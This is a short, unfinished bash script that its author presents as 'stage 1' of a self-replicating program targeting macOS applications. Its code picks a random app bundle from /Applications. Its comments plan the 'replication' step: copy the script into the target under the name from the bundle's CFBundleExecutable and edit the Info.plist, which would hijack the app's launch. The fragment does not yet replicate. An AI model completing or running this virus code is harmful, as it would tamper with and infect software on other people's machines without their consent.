#!/bin/bash
#This is stage 1, re-written
#I decided to re-write stage 1 as it probably doesn't work at all,
#and also is more commentary than code
#Anywho, I present to you, stage 1:

#Application roulette; coppied from stage-1-old, and needs to be tested:
loc=(/Applications/*)
APPDIR="${loc[RANDOM % ${#loc[@]}]}/"
#For the next part (replication), instead of trying to use the output of
#ls, this script will read a target's Info.plist and use the value of the 
#CFBundleExecutable to both name its copy, and edit the Info.plist
